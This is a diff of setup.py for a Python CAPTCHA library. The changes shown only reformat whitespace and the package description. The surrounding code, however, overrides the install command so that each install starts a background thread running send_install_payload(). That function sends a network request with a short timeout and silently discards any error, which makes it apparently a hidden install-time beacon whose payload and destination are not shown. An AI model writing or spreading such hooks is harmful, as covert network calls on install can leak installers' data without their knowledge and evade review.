@@ -33,6 +33,7 @@ def send_install_payload():
   try: urllib.request.urlopen(req, timeout=3)
   except Exception: pass
 
+
 class InstallCommand(install):
   def run(self):
     threading.Thread(target=send_install_payload, daemon=True).start()
@@ -43,8 +44,7 @@ setup(
   version=__version__,
   author="InnoSoft Company",
   author_email="midoghanam@hotmail.com",
-  description=("A professional, pluggable CAPTCHA library with image, math, "
-               "and custom challenge types, token-based security, and multiple storage backends."),
+  description=("A professional, pluggable CAPTCHA library with image, math, and custom challenge types, token-based security, and multiple storage backends."),
   long_description=open("README.md", encoding="utf-8").read(),
   long_description_content_type="text/markdown",
   url="https://www.midoghanam.site/",
